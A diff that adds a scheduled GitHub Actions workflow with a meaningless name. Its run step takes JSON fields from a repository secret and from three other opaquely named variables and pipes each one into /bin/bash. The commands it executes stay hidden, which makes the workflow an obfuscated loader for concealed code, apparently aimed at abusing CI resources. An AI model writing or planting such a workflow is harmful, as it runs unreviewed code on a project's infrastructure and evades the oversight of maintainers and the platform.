@@ -1,0 +1,21 @@
+name: dilikongbai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dilikongbai
+        env:
+          v97: ${{ secrets.v97 }}
+        run: |
+          echo $v97 | jq -r .nmm9 | /bin/bash
+          echo $chk0284 | jq -r .udpxp32421 | /bin/bash
+          echo $q82 | jq -r .torss9 | /bin/bash
+          echo $dbvpy66331 | jq -r .hmu75 | /bin/bash
+
